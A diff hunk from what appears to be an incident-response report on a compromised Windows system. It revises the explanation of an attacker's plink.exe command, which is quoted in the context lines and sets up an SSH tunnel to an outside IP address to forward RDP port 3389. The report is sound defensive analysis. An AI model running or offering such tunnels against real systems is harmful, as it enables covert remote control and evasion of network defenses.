@@ -204,7 +204,7 @@ The second and third stages of the infection involved the execution of PowerShel
      Command: plink.exe -ssh 69.50.64.20 -P 22 -L 127.0.0.1:12345:10.2.0.2:3389
      ```
 
-   - **Significance:** The use of port `3389` is particularly concerning, as it allows the attacker to operate a remote desktop session, effectively gaining complete control over the system.
+   - **Significance:** The execution of plink.exe and its use for SSH tunneling and RDP forwarding were critical in ensuring the attacker could maintain control over the compromised system. This persistence mechanism allowed the attacker to bypass network defenses and potentially exfiltrate data or execute further commands remotely. The fact that the forwarded port was 3389, the default port for RDP, indicates the attacker was specifically aiming to enable remote desktop access, which is a strong indication of the sophistication and intent behind the compromise..
 
 ---
 
